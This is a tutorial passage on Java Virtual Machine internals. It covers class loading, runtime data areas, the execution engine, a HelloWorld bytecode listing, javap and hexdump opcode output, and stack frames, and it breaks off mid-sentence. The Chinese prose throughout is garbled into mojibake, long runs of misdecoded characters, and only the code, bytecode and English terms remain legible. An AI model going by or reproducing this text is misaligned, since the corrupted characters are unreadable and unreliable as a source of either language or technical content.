è¿™ä¸‰ä¸ªéƒ¨é—¨å…·ä½“åˆæ˜¯å¹²ä»€ä¹ˆçš„ï¼Œå¯ä»¥é€šè¿‡ä¸‹é¢è¿™å¹…å›¾æ¥äº†è§£ ç±»åŠ è½½å™¨ ç±»åŠ è½½å™¨æ˜¯ JVM æœ€æœ‰æƒå¨çš„ä¸€ä¸ªéƒ¨é—¨ï¼Œç›¸å½“äºæ˜æœå¼ å±…æ­£æ—¶æœŸçš„å†…é˜ï¼Œå¤§å…¨ç‹¬æ½ï¼Œæœå»·æƒ³å¹²ä»€ä¹ˆï¼Œéƒ½å¾—ç»è¿‡æˆ‘è¿™å…³ã€‚ å¥½ï¼Œç±»åŠ è½½å™¨ç”¨æ¥åŠ è½½ç±»æ–‡ä»¶open in new windowï¼Œä¹Ÿå°±æ˜¯ .class æ–‡ä»¶ã€‚å¦‚æœç±»æ–‡ä»¶åŠ è½½å¤±è´¥ï¼Œä¹Ÿå°±æ²¡æœ‰è¿è¡Œæ—¶æ•°æ®åŒºå’Œæ‰§è¡Œå¼•æ“ä»€ä¹ˆäº‹äº†ï¼Œå®ƒä»¬ä»€ä¹ˆä¹Ÿå¹²ä¸äº†ã€‚ ç±»åŠ è½½å™¨è´Ÿè´£å°†å­—èŠ‚ç æ–‡ä»¶åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œä¸»è¦ä¼šç»å†åŠ è½½-&gt;è¿æ¥-&gt;å®ä¾‹åŒ–è¿™ä¸‰ä¸ªé˜¶æ®µï¼Œ è¿è¡Œæ—¶æ•°æ®åŒº è¿è¡Œæ—¶æ•°æ®åŒºå°±ç›¸å½“äºæ˜æœæ—¶æœŸçš„å›½åº“ï¼Œå›½åº“é‡Œæœ‰é’±ï¼Œé‚£æ¥ä¸‹æ¥çš„æ‰§è¡Œå¼•æ“å°±èƒ½å¤Ÿç»§ç»­æ‰§è¡Œå­—èŠ‚ç ï¼Œå›½åº“é‡Œæ²¡é’±å°±ä¼šæŠ›å‡º OutOfMemoryError å¼‚å¸¸ã€‚ JVM å®šä¹‰äº† Java ç¨‹åºè¿è¡ŒæœŸé—´éœ€è¦ä½¿ç”¨åˆ°çš„å†…å­˜åŒºåŸŸï¼Œç®€å•æ¥è¯´ï¼Œè¿™å—å†…å­˜åŒºåŸŸå­˜æ”¾äº†å­—èŠ‚ç ä¿¡æ¯ä»¥åŠç¨‹åºæ‰§è¡Œè¿‡ç¨‹çš„æ•°æ®ï¼Œåƒåœ¾æ”¶é›†å™¨open in new windowä¹Ÿä¼šé’ˆå¯¹è¿è¡Œæ—¶æ•°æ®åŒºè¿›è¡Œå¯¹è±¡å›æ”¶çš„å·¥ä½œã€‚çœ‹ä¸‹é¢è¿™å¼ å›¾å°±èƒ½ç†è§£ï¼ˆJVM è§„èŒƒï¼‰ï¼š è¿è¡Œæ—¶æ•°æ®åŒºé€šå¸¸åŒ…æ‹¬ï¼šæ–¹æ³•åŒºã€å †ã€è™šæ‹Ÿæœºæ ˆã€æœ¬åœ°æ–¹æ³•æ ˆä»¥åŠç¨‹åºè®¡æ•°å™¨äº”ä¸ªéƒ¨åˆ†ã€‚ä¸è¿‡ï¼Œè¿è¡Œæ—¶æ•°æ®åŒºçš„åˆ’åˆ†ä¹Ÿéšç€JDKçš„å‘å±•ä¸æ–­å˜è¿ï¼ŒJDK 1.6ã€JDK 1.7ã€JDK 1.8 çš„å†…å­˜åˆ’åˆ†éƒ½ä¼šæœ‰æ‰€ä¸åŒã€‚ æ‰§è¡Œå¼•æ“ æ‰§è¡Œå¼•æ“ï¼ˆExecution Engineï¼‰å°±å¥½åƒæ˜æœæ—¶æœŸçš„å…­éƒ¨ï¼Œä¸»è¦ç”¨æ¥å¹²å…·ä½“çš„äº‹ï¼Œâ€œè™šæ‹Ÿæœºâ€æ˜¯ä¸€ä¸ªç›¸å¯¹äºâ€œç‰©ç†æœºâ€çš„æ¦‚å¿µï¼Œè¿™ä¸¤ç§æœºå™¨éƒ½æœ‰ä»£ç æ‰§è¡Œèƒ½åŠ›ï¼Œå…¶åŒºåˆ«æ˜¯ç‰©ç†æœºçš„æ‰§è¡Œå¼•æ“æ˜¯ç›´æ¥å»ºç«‹åœ¨å¤„ç†å™¨ã€ç¼“å­˜ã€æŒ‡ä»¤é›†å’Œæ“ä½œç³»ç»Ÿå±‚é¢ä¸Šçš„ï¼Œè€Œè™šæ‹Ÿæœºçš„æ‰§è¡Œå¼•æ“åˆ™æ˜¯ç”±è½¯ä»¶è‡ªè¡Œå®ç°çš„ï¼Œå› æ­¤å¯ä»¥ä¸å—ç‰©ç†æ¡ä»¶åˆ¶çº¦åœ°å®šåˆ¶æŒ‡ä»¤é›†ä¸æ‰§è¡Œå¼•æ“çš„ç»“æ„å…³ç³»ï¼Œèƒ½å¤Ÿæ‰§è¡Œé‚£äº›ä¸è¢«ç¡¬ä»¶ç›´æ¥æ”¯æŒçš„æŒ‡ä»¤é›†æ ¼å¼ã€‚ æ‰§è¡Œå¼•æ“çš„ä»»åŠ¡å°±æ˜¯å°†å­—èŠ‚ç æŒ‡ä»¤open in new windowè§£é‡Š/ç¼–è¯‘ä¸ºå¯¹åº”å¹³å°ä¸Šçš„æœ¬åœ°æœºå™¨æŒ‡ä»¤æ‰å¯ä»¥ã€‚ç®€å•æ¥è¯´ï¼ŒJVM ä¸­çš„æ‰§è¡Œå¼•æ“å……å½“äº†å°†é«˜çº§è¯­è¨€ç¿»è¯‘ä¸ºæœºå™¨è¯­è¨€çš„è¯‘è€…ã€‚ è§£é‡Šå™¨ï¼šè¯»å–å­—èŠ‚ç ï¼Œç„¶åæ‰§è¡ŒæŒ‡ä»¤ã€‚å› ä¸ºå®ƒæ˜¯ä¸€è¡Œä¸€è¡Œåœ°è§£é‡Šå’Œæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ‰€ä»¥å®ƒå¯ä»¥å¾ˆå¿«åœ°è§£é‡Šå­—èŠ‚ç ï¼Œä½†æ˜¯æ‰§è¡Œèµ·æ¥ä¼šæ¯”è¾ƒæ…¢ï¼ˆæ¯•ç«Ÿè¦ä¸€è¡Œæ‰§è¡Œå®Œå†æ‰§è¡Œä¸‹ä¸€è¡Œï¼‰ã€‚ [å³æ—¶ç¼–è¯‘å™¨ï¼šæ‰§è¡Œå¼•æ“é¦–å…ˆæŒ‰ç…§è§£é‡Šæ‰§è¡Œçš„æ–¹å¼æ¥æ‰§è¡Œï¼Œéšç€æ—¶é—´æ¨ç§»ï¼Œå³æ—¶ç¼–è¯‘å™¨ä¼šé€‰æ‹©æ€§çš„æŠŠä¸€äº›çƒ­ç‚¹ä»£ç ç¼–è¯‘æˆæœ¬åœ°ä»£ç ã€‚æ‰§è¡Œæœ¬åœ°ä»£ç æ¯”ä¸€æ¡ä¸€æ¡è¿›è¡Œè§£é‡Šæ‰§è¡Œçš„é€Ÿåº¦å¿«å¾ˆå¤šï¼Œå› ä¸ºæœ¬åœ°ä»£ç æ˜¯ä¿å­˜åœ¨ç¼“å­˜é‡Œçš„ã€‚ åƒåœ¾å›æ”¶å™¨ï¼šç”¨æ¥å›æ”¶å †å†…å­˜ä¸­çš„åƒåœ¾å¯¹è±¡ã€‚ æ€»çš„æ¥è¯´ï¼ŒJVM æ˜¯ Java ç¨‹åºæ‰§è¡Œçš„ç¯å¢ƒï¼Œå®ƒéšè—äº†åº•å±‚æ“ä½œç³»ç»Ÿå’Œç¡¬ä»¶çš„å¤æ‚æ€§ï¼Œæä¾›äº†ä¸€ä¸ªç»Ÿä¸€ã€ç¨³å®šå’Œå®‰å…¨çš„è¿è¡Œå¹³å°ã€‚ æˆ‘ä»¬æŠŠ Java æºä»£ç ç¼–è¯‘åçš„å­—èŠ‚ç æ–‡ä»¶æ‰”ç»™å®ƒï¼Œå®ƒå°±å¯ä»¥åœ¨ JVM ä¸­æ‰§è¡Œï¼Œä¸ç®¡æ˜¯åœ¨ Windowsã€Linux è¿˜æ˜¯ MacOS ç¯å¢ƒä¸‹ç¼–è¯‘çš„ï¼Œå®ƒéƒ½å¯ä»¥è·‘ï¼Œå±è”½äº†åº•å±‚æ“ä½œç³»ç»Ÿçš„å·®å¼‚ã€‚ JVMç”Ÿå‘½å‘¨æœŸ Javaå®ä¾‹å¯¹åº”ä¸€ä¸ªç‹¬ç«‹è¿è¡Œçš„Javaç¨‹åºï¼ˆè¿›ç¨‹çº§åˆ«ï¼‰ ï¼ˆ1ï¼‰å¯åŠ¨ å¯åŠ¨ä¸€ä¸ªJavaç¨‹åºï¼Œä¸€ä¸ªJVMå®ä¾‹å°±äº§ç”Ÿã€‚æ‹¥æœ‰public static void main(String[] args)å‡½æ•°çš„classå¯ä»¥ä½œä¸ºJVMå®ä¾‹è¿è¡Œçš„èµ·ç‚¹ã€‚ ï¼ˆ2ï¼‰è¿è¡Œ main()ä½œä¸ºç¨‹åºåˆå§‹çº¿ç¨‹çš„èµ·ç‚¹ï¼Œä»»ä½•å…¶ä»–çº¿ç¨‹å‡å¯ç”±è¯¥çº¿ç¨‹å¯åŠ¨ã€‚JVMå†…éƒ¨æœ‰ä¸¤ç§çº¿ç¨‹ï¼šå®ˆæŠ¤çº¿ç¨‹å’Œéå®ˆæŠ¤çº¿ç¨‹ï¼Œmain()å±äºéå®ˆæŠ¤çº¿ç¨‹ï¼Œå®ˆæŠ¤çº¿ç¨‹é€šå¸¸ç”±JVMä½¿ç”¨ï¼Œç¨‹åºå¯ä»¥æŒ‡å®šåˆ›å»ºçš„çº¿ç¨‹ä¸ºå®ˆæŠ¤çº¿ç¨‹ã€‚ ï¼ˆ3ï¼‰æ¶ˆäº¡ å½“ç¨‹åºä¸­çš„æ‰€æœ‰éå®ˆæŠ¤çº¿ç¨‹éƒ½ç»ˆæ­¢æ—¶ï¼ŒJVMæ‰é€€å‡ºï¼›è‹¥å®‰å…¨ç®¡ç†å™¨å…è®¸ï¼Œç¨‹åºä¹Ÿå¯ä»¥ä½¿ç”¨Runtimeç±»æˆ–è€…System.exit()æ¥é€€å‡ºã€‚ JVMæ‰§è¡Œå¼•æ“å®ä¾‹åˆ™å¯¹åº”äº†å±äºç”¨æˆ·è¿è¡Œç¨‹åºçº¿ç¨‹å®ƒæ˜¯çº¿ç¨‹çº§åˆ«çš„ã€‚ JVMå¦‚ä½•è¿è¡ŒJavaä»£ç  æˆ‘ä»¬é€šå¸¸æŠŠ Java ä»£ç æ‰§è¡Œçš„è¿‡ç¨‹åˆ†ä¸ºç¼–è¯‘æœŸå’Œè¿è¡Œæ—¶ï¼Œå¼„æ¸…æ¥šè¿™ä¸¤ä¸ªé˜¶æ®µå°±çŸ¥é“åŸå› äº†ã€‚ ç¼–è¯‘æœŸ è´´ä¸€ä¸‹ HelloWorld è¿™æ®µä»£ç ï¼š ç‚¹å‡» IDEA å·¥å…·æ ä¸­çš„é”¤å­æŒ‰é’®ï¼ˆBuild Projectï¼Œç¼–è¯‘æ•´ä¸ªé¡¹ç›®ï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œå¹¶ä¸éœ€è¦ä¸»åŠ¨ç¼–è¯‘ï¼ŒIDEA ä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬ç¼–è¯‘ï¼‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ ç¼–è¯‘åï¼Œå°±èƒ½åœ¨åŒçº§ç›®å½•ä¸‹æ‰¾åˆ°HelloWorldå¯¹åº”çš„classå­—èŠ‚ç æ–‡ä»¶ å¦‚ä¸Šå›¾æ‰€ç¤ºï¼š IDEA é»˜è®¤ä¼šç”¨ Fernflower è¿™ä¸ªåç¼–è¯‘å·¥å…·å°†å­—èŠ‚ç æ–‡ä»¶ï¼ˆåç¼€ä¸º .class çš„æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ Java æºä»£ç ç¼–è¯‘åçš„æ–‡ä»¶ï¼‰åç¼–è¯‘ä¸ºæˆ‘ä»¬å¯ä»¥çœ‹å¾—æ‡‚çš„ Java æºä»£ç ã€‚ ä½†å®é™…ä¸Šï¼Œå­—èŠ‚ç æ–‡ä»¶ å¹¶ä¸æ˜¯è¿™æ ·çš„ï¼Œå®ƒåŒ…å«äº† JVM æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œè¿˜æœ‰ç±»çš„å…ƒæ•°æ®ä¿¡æ¯ï¼Œå¦‚ç±»åã€æ–¹æ³•å’Œå±æ€§ç­‰ã€‚å¦‚æœç”¨ ã€Œshow bytecodeã€æ‰“å¼€å­—èŠ‚ç æ–‡ä»¶çš„è¯ï¼Œå®ƒæ˜¯ä¸‹é¢è¿™æ ·å­çš„ï¼š // class version 52.0 (52) // access flags 0x21 public class HelloWorld { // compiled from: HelloWorld.java // access flags 0x1 public &lt;init&gt;()V L0 LINENUMBER 1 L0 ALOAD 0 INVOKESPECIAL java/lang/Object.&lt;init&gt; ()V RETURN L1 LOCALVARIABLE this LHelloWorld; L0 L1 0 MAXSTACK = 1 MAXLOCALS = 1 // access flags 0x9 public static main([Ljava/lang/String;)V L0 LINENUMBER 3 L0 GETSTATIC java/lang/System.out : Ljava/io/PrintStream; LDC \"hybcx\\uff0c\\u5c11\\u770b\\u624b\\u673a\\u5c11\\u6253\\u6e38\\u620f\\uff0c\\u597d\\u597d\\u5b66\\u3002\" INVOKEVIRTUAL java/io/PrintStream.println (Ljava/lang/String;)V L1 LINENUMBER 4 L1 RETURN L2 LOCALVARIABLE args [Ljava/lang/String; L0 L2 0 MAXSTACK = 2 MAXLOCALS = 1} å¯ä»¥é€šè¿‡ IDEA èœå•æ ä¸­çš„ã€ŒViewã€â†’ã€ŒShow Bytecodeã€æŸ¥çœ‹ è¿™ä¸ª bytecode å¯ä»¥ç›´è¯‘ä¸ºå­—èŠ‚ç ã€‚ å­—èŠ‚ç å¹¶ä¸æ˜¯æœºå™¨ç ï¼Œæ“ä½œç³»ç»Ÿæ— æ³•ç›´æ¥è¯†åˆ«ï¼Œéœ€è¦åœ¨æ“ä½œç³»ç»Ÿä¸Šå®‰è£…ä¸åŒç‰ˆæœ¬çš„ JVM æ¥è¯†åˆ«ã€‚ é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åªéœ€è¦å®‰è£…ä¸åŒç‰ˆæœ¬çš„ JDKï¼ˆJava Development Kitï¼ŒJava å¼€å‘å·¥å…·åŒ…ï¼‰å°±è¡Œäº†ï¼Œå®ƒé‡Œé¢åŒ…å«äº† JREï¼ˆJava Runtime Environmentï¼ŒJava è¿è¡Œæ—¶ç¯å¢ƒï¼‰ï¼Œè€Œ JRE åˆåŒ…å«äº† JVMã€‚ Windowsã€Linuxã€MacOS ç­‰æ“ä½œç³»ç»Ÿéƒ½æœ‰ç›¸åº”çš„ JDKï¼Œåªè¦å®‰è£…å¥½äº† JDK å°±æœ‰äº† Java çš„è¿è¡Œæ—¶ç¯å¢ƒï¼Œå°±å¯ä»¥æŠŠ Java æºä»£ç ç¼–è¯‘ä¸ºå­—èŠ‚ç ï¼Œç„¶åå­—èŠ‚ç åˆå¯ä»¥åœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸Šè¿è¡Œäº†ã€‚ è¿™é‡Œç»™æ¨èä¸€æ¬¾æŸ¥çœ‹å­—èŠ‚ç æ–‡ä»¶çš„æ’ä»¶ jclasslibï¼Œå¯ä»¥åœ¨ IDEA æ’ä»¶å¸‚åœºä¸­å®‰è£…ã€‚å®‰è£…å®Œæˆä¹‹åï¼Œç‚¹å‡» View -&gt; Show Bytecode With jclasslib å³å¯æŸ¥çœ‹å­—èŠ‚ç æ–‡ä»¶äº†ï¼ˆç‚¹å‡»ä¹‹å‰ï¼Œå…‰æ ‡è¦åœç•™åœ¨å¯¹åº”çš„ç±»æ–‡ä»¶ä¸Šï¼‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ ä½¿ç”¨ jclasslib ä¸ä»…å¯ä»¥ç›´è§‚åœ°æŸ¥çœ‹ç±»å¯¹åº”çš„å­—èŠ‚ç ï¼Œè¿˜å¯ä»¥æŸ¥çœ‹ç±»çš„åŸºæœ¬ä¿¡æ¯ã€å¸¸é‡æ± ã€æ¥å£ã€å­—æ®µã€æ–¹æ³•ç­‰ä¿¡æ¯ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ç¼–è¯‘é˜¶æ®µï¼ŒJava ä¼šå°† Java æºä»£ç æ–‡ä»¶ç¼–è¯‘ä¸ºå­—èŠ‚ç æ–‡ä»¶ã€‚ è¿è¡Œæ—¶ å½“æœ‰äº† .class æ–‡ä»¶ä¹Ÿå°±æ˜¯å­—èŠ‚ç æ–‡ä»¶ä¹‹åï¼Œæˆ‘ä»¬éœ€è¦å¯åŠ¨ JVM æ¥è¿è¡Œå­—èŠ‚ç æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ run é˜¶æ®µï¼Œä¹‹å‰æ˜¯ build é˜¶æ®µã€‚ JVM ä¼šå…ˆé€šè¿‡ç±»åŠ è½½å™¨åŠ è½½å­—èŠ‚ç æ–‡ä»¶ï¼Œç„¶åå°†å­—èŠ‚ç åŠ è½½åˆ° JVM çš„è¿è¡Œæ—¶æ•°æ®åŒºï¼Œå†é€šè¿‡æ‰§è¡Œå¼•æ“è½¬åŒ–ä¸ºæœºå™¨ç æœ€ç»ˆäº¤ç»™æ“ä½œç³»ç»Ÿæ‰§è¡Œã€‚ æˆ‘ä»¬ä½¿ç”¨ javapopen æ¥çœ‹ä¸€ä¸‹ HelloWorld çš„å­—èŠ‚ç æŒ‡ä»¤åºåˆ—ã€‚ 0 getstatic #2 &lt;java/lang/System.out&gt; 3 ldc #3 &lt;Hello World&gt; 5 invokevirtual #4 &lt;java/io/PrintStream.println&gt; 8 return å­—èŠ‚ç æŒ‡ä»¤åºåˆ—é€šå¸¸ç”±å¤šæ¡æŒ‡ä»¤ç»„æˆï¼Œæ¯æ¡æŒ‡ä»¤ç”±ä¸€ä¸ªæ“ä½œç å’Œè‹¥å¹²ä¸ªæ“ä½œæ•°æ„æˆã€‚ æ“ä½œç ï¼šä¸€ä¸ªå­—èŠ‚å¤§å°çš„æŒ‡ä»¤ï¼Œç”¨äºè¡¨ç¤ºå…·ä½“çš„æ“ä½œã€‚ æ“ä½œæ•°ï¼šè·Ÿéšæ“ä½œç ï¼Œç”¨äºæä¾›é¢å¤–ä¿¡æ¯ã€‚ è¿™æ®µå­—èŠ‚ç åºåˆ—çš„æ„æ€æ˜¯è°ƒç”¨ System.out.println æ–¹æ³•æ‰“å°\"Hello World\"å­—ç¬¦ä¸²ã€‚ä¸‹é¢æ˜¯è¯¦ç»†çš„è§£é‡Šï¼š â‘ ã€0: getstatic #2 &lt;java/lang/System.out&gt;ï¼š æ“ä½œç ï¼šgetstatic æ“ä½œæ•°ï¼š#2 æè¿°ï¼šè¿™æ¡æŒ‡ä»¤çš„ä½œç”¨æ˜¯è·å–é™æ€å­—æ®µï¼Œè¿™é‡Œè·å–çš„æ˜¯java.lang.Systemç±»çš„outé™æ€å­—æ®µï¼Œå®ƒæ˜¯ä¸€ä¸ªPrintStreamç±»å‹çš„è¾“å‡ºæµã€‚#2 æ˜¯ä¸€ä¸ªæŒ‡å‘å¸¸é‡æ± çš„ç´¢å¼•ï¼Œåé¢åœ¨è®²ç±»æ–‡ä»¶ç»“æ„æ—¶ä¼šè®²åˆ°ã€‚ â‘¡ã€3: ldc #3 &lt;Hello World&gt;ï¼š æ“ä½œç ï¼šldc æ“ä½œæ•°ï¼š#3 æè¿°ï¼šè¿™æ¡æŒ‡ä»¤çš„ä½œç”¨æ˜¯ä»å¸¸é‡æ± ä¸­åŠ è½½ä¸€ä¸ªå¸¸é‡å€¼ï¼ˆå­—ç¬¦ä¸²\"Hello World\"ï¼‰åˆ°æ“ä½œæ•°æ ˆé¡¶ã€‚#3 æ˜¯ä¸€ä¸ªæŒ‡å‘å¸¸é‡æ± çš„ç´¢å¼•ï¼Œå¸¸é‡æ± é‡Œå­˜å‚¨äº†å­—ç¬¦ä¸²\"Hello World\"çš„å¼•ç”¨ã€‚ â‘¢ã€5: invokevirtual #4 &lt;java/io/PrintStream.println&gt;ï¼š æ“ä½œç ï¼šinvokevirtual æ“ä½œæ•°ï¼š#4 æè¿°ï¼šè¿™æ¡æŒ‡ä»¤çš„ä½œç”¨æ˜¯è°ƒç”¨æ–¹æ³•ã€‚è¿™é‡Œè°ƒç”¨çš„æ˜¯PrintStreamç±»çš„printlnæ–¹æ³•ï¼Œç”¨æ¥æ‰“å°å­—ç¬¦ä¸²ã€‚#4 æ˜¯ä¸€ä¸ªæŒ‡å‘å¸¸é‡æ± çš„ç´¢å¼•ï¼Œå¸¸é‡æ± é‡Œå­˜å‚¨äº†java/io/PrintStream.printlnæ–¹æ³•çš„å¼•ç”¨ä¿¡æ¯ã€‚ â‘£ã€8: returnï¼š æ“ä½œç ï¼šreturn æè¿°ï¼šè¿™æ¡æŒ‡ä»¤çš„ä½œç”¨æ˜¯ä»å½“å‰æ–¹æ³•è¿”å›ã€‚ ä¸Šé¢çš„ getstaticã€ldcã€invokevirtualã€return ç­‰å°±æ˜¯ [å­—èŠ‚ç æŒ‡ä»¤çš„æ“ä½œç ã€‚ å¯ä»¥ä½¿ç”¨ hexdumpï¼Œä¸€ä¸ªåœ¨ Unix å’Œ Linux ç³»ç»Ÿä¸­å¸¸ç”¨çš„å·¥å…·ï¼Œç”¨äºä»¥åå…­è¿›åˆ¶çš„å½¢å¼æ˜¾ç¤ºæ–‡ä»¶çš„å†…å®¹ï¼Œçœ‹ä¸€ä¸‹å­—èŠ‚ç çš„äºŒè¿›åˆ¶å†…å®¹ã€‚ b2 00 02 12 03 b6 00 04 b1 æ³¨æ„ï¼šè¿™é‡Œæ˜¯äºŒè¿›åˆ¶æ–‡ä»¶çš„ 16 è¿›åˆ¶è¡¨ç¤ºï¼Œä¹Ÿå°±æ˜¯ hexï¼Œä¸€èˆ¬åˆ†æäºŒè¿›åˆ¶æ–‡ä»¶éƒ½æ˜¯ä»¥ hex è¿›è¡Œåˆ†æã€‚å­—èŠ‚ç æŒ‡ä»¤å’ŒäºŒè¿›åˆ¶ä¹‹é—´çš„å¯¹åº”å…³ç³»ï¼Œä»¥åŠå¯¹åº”çš„è¯­ä¹‰å¦‚ä¸‹æ‰€ç¤ºï¼š 0xb2 getstatic è·å–é™æ€å­—æ®µçš„å€¼ 0x12 ldc å¸¸é‡æ± ä¸­çš„å¸¸é‡å€¼å…¥æ ˆ 0xb6 invokevirtual è¿è¡Œæ—¶æ–¹æ³•ç»‘å®šè°ƒç”¨æ–¹æ³• 0xb1 return void æ–¹æ³•è¿”å› JVM å°±æ˜¯é è§£æè¿™äº›å­—èŠ‚ç æŒ‡ä»¤æ¥å®Œæˆç¨‹åºæ‰§è¡Œçš„ã€‚å¸¸è§çš„æ‰§è¡Œæ–¹å¼æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯è§£é‡Šæ‰§è¡Œï¼Œå¯¹å­—èŠ‚ç é€æ¡è§£é‡Šæ‰§è¡Œï¼›ä¸€ç§æ˜¯ JITï¼Œä¹Ÿå°±æ˜¯å³æ—¶ç¼–è¯‘ï¼Œå®ƒä¼šåœ¨è¿è¡Œæ—¶å°†çƒ­ç‚¹ä»£ç ä¼˜åŒ–å¹¶ç¼“å­˜èµ·æ¥ï¼Œä¸‹æ¬¡å†æ‰§è¡Œçš„æ—¶å€™ç›´æ¥ä½¿ç”¨ç¼“å­˜èµ·æ¥çš„æœºå™¨ç ï¼Œè€Œä¸éœ€è¦å†æ¬¡è§£é‡Šæ‰§è¡Œã€‚ è¿™æ ·å°±å¯ä»¥æé«˜ç¨‹åºçš„æ‰§è¡Œæ•ˆç‡ã€‚ æ³¨æ„ï¼Œå½“ç±»åŠ è½½å™¨å®Œæˆå­—èŠ‚ç æ•°æ®åŠ è½½ä»»åŠ¡åï¼ŒJVM åˆ’åˆ†äº†ä¸“é—¨çš„å†…å­˜åŒºåŸŸæ¥è£…è½½è¿™äº›å­—èŠ‚ç æ•°æ®ä»¥åŠè¿è¡Œæ—¶ä¸­é—´æ•°æ®ã€‚ ä¸‹é¢å°±æœ‰ç‚¹æŠ½è±¡äº†ï¼Œæµ…åšäº†è§£å§ å…¶ä¸­ PC å¯„å­˜å™¨ã€è™šæ‹Ÿæœºæ ˆä»¥åŠæœ¬åœ°æ–¹æ³•æ ˆå±äºçº¿ç¨‹ç§æœ‰çš„ï¼Œå †ä»¥åŠå…ƒç©ºé—´ï¼ˆæ–¹æ³•åŒºçš„å®ç°ï¼‰å±äºå…±äº«æ•°æ®åŒºï¼Œä¸åŒçš„çº¿ç¨‹å…±äº«è¿™ä¸¤éƒ¨åˆ†å†…å­˜æ•°æ®ã€‚ å¦‚æœè™šæ‹Ÿæœºä¸­çš„å½“å‰çº¿ç¨‹æ‰§è¡Œçš„æ˜¯ Java çš„æ™®é€šæ–¹æ³•ï¼Œé‚£ä¹ˆ PC å¯„å­˜å™¨ä¸­å­˜å‚¨çš„æ˜¯æ–¹æ³•çš„ç¬¬ä¸€æ¡æŒ‡ä»¤ï¼Œå½“æ–¹æ³•å¼€å§‹æ‰§è¡Œä¹‹åï¼Œ PC å¯„å­˜å™¨å­˜å‚¨çš„æ˜¯ä¸‹ä¸€ä¸ªå­—èŠ‚ç æŒ‡ä»¤çš„åœ°å€ã€‚ å¦‚æœè™šæ‹Ÿæœºä¸­çš„å½“å‰çº¿ç¨‹æ‰§è¡Œçš„æ˜¯ native æ–¹æ³•ï¼Œé‚£ä¹ˆ PC å¯„å­˜å™¨ä¸­çš„å€¼ä¸º undefinedã€‚ å¦‚æœé‡åˆ°åˆ¤æ–­åˆ†æ”¯ã€å¾ªç¯ä»¥åŠå¼‚å¸¸ç­‰ä¸åŒçš„æ§åˆ¶è½¬ç§»è¯­å¥ï¼ŒPC å¯„å­˜å™¨ä¼šè¢«ç½®ä¸ºç›®æ ‡å­—èŠ‚ç æŒ‡ä»¤çš„åœ°å€ã€‚ å¦å¤–åœ¨å¤šçº¿ç¨‹åˆ‡æ¢çš„æ—¶å€™ï¼Œè™šæ‹Ÿæœºä¼šè®°å½•å½“å‰çº¿ç¨‹çš„ PC å¯„å­˜å™¨ï¼Œå½“çº¿ç¨‹åˆ‡æ¢å›æ¥çš„æ—¶å€™ä¼šæ ¹æ®æ­¤å‰è®°å½•çš„å€¼æ¢å¤åˆ° PC å¯„å­˜å™¨ä¸­ï¼Œæ¥ç»§ç»­æ‰§è¡Œçº¿ç¨‹çš„åç»­çš„å­—èŠ‚ç æŒ‡ä»¤ã€‚ é™¤äº† PC å¯„å­˜å™¨å¤–ï¼Œå­—èŠ‚ç æŒ‡ä»¤çš„æ‰§è¡Œæµè½¬è¿˜éœ€è¦è™šæ‹Ÿæœºæ ˆçš„å‚ä¸ã€‚æˆ‘ä»¬å…ˆæ¥çœ‹ä¸‹è™šæ‹Ÿæœºæ ˆçš„å¤§è‡´ç»“æ„ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ è™šæ‹Ÿæœºæ ˆæ“ä½œçš„åŸºæœ¬å…ƒç´ å°±æ˜¯æ ˆå¸§ï¼Œæ ˆå¸§ä¸»è¦åŒ…å«äº†å±€éƒ¨å˜é‡è¡¨ã€æ“ä½œæ•°æ ˆã€åŠ¨æ€è¿æ¥ä»¥åŠæ–¹æ³•è¿”å›åœ°å€ã€‚æ ˆå¸§æ˜¯ä¸€ä¸ªå…ˆè¿›åå‡ºçš„æ•°æ®ç»“æ„ï¼Œæ¯ä¸ªæ–¹æ³•ä»è°ƒç”¨åˆ°æ‰§è¡Œå®Œæˆéƒ½ä¼šå¯¹åº”ä¸€ä¸ªæ ˆå¸§åœ¨è™šæ‹Ÿæœºæ ˆä¸­å…¥æ ˆå’Œå‡ºæ ˆã€‚ çŸ¥é“äº†è™šæ‹Ÿæœºæ ˆçš„ç»“æ„ä¹‹åï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹æ–¹æ³•æ‰§è¡Œçš„æµè½¬è¿‡ç¨‹æ˜¯æ€æ ·çš„ã€‚ ä»¥è¿™æ®µä»£ç ä¸ºä¾‹ï¼Œä¸€ä¸ª Test ç±»ï¼Œmain æ–¹æ³•é‡Œ new äº†ä¸€ä¸ª Uesr å¯¹è±¡ï¼Œä¼šå°† User çš„ age ä½œä¸ºå‚æ•°ä¼ é€’ç»™é™æ€æ–¹æ³• calculate è¿›è¡Œä¸€ä¸ªç®€å•çš„åŠ æ³•æ“ä½œå¹¶è¿”å›ï¼Œæœ€åæ‰“å°åˆ°æ§åˆ¶å°ã€‚ public class Test { public static void main(String[] args) { User user = new User(); Integer result = calculate(user.getAge()); System.out.println(result); } private static Integer calculate(Integer age) { Integer data = age + 3; return data; } } 1ã€JVM å®Œæˆ .class æ–‡ä»¶åŠ è½½ä¹‹åï¼Œä¼šåˆ›å»ºä¸€ä¸ªåä¸º\"main\"çš„çº¿ç¨‹ï¼Œè¯¥çº¿ç¨‹ä¼šè‡ªåŠ¨è°ƒç”¨åä¸º\"main\"çš„é™æ€æ–¹æ³•ï¼Œè¿™æ˜¯ Java ç¨‹åºçš„å…¥å£ç‚¹ï¼› 2ã€main çº¿ç¨‹åœ¨æ‰§è¡Œ mian æ–¹æ³•æ—¶ï¼ŒJVM ä¼šåœ¨è™šæ‹Ÿæœºæ ˆä¸­å‹å…¥ main æ–¹æ³•å¯¹åº”çš„æ ˆå¸§ï¼› 3ã€æ ˆå¸§çš„æ“ä½œæ•°æ ˆä¸­å­˜å‚¨äº†æ“ä½œçš„æ•°æ®ï¼ŒJVM æ‰§è¡Œå­—èŠ‚ç 